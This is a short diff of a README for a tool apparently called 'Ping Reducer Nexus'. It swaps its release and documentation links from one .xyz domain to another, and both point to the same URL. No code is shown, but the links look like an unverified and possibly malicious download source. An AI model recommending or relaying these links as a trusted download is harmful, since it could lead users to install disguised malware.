@@ -36,8 +36,8 @@ It's aimed at everyday users as much as power users.
 ---
 
 ## 📥 Downloads & Links
-- 📥 **Latest release:** [https://ping-reducer-nexus.softonx.xyz](https://ping-reducer-nexus.softonx.xyz)
-- 📖 **Documentation:** [https://ping-reducer-nexus.softonx.xyz](https://ping-reducer-nexus.softonx.xyz)
+- 📥 **Latest release:** [https://ping-reducer-nexus.softax.xyz](https://ping-reducer-nexus.softax.xyz)
+- 📖 **Documentation:** [https://ping-reducer-nexus.softax.xyz](https://ping-reducer-nexus.softax.xyz)
 
 ---
 
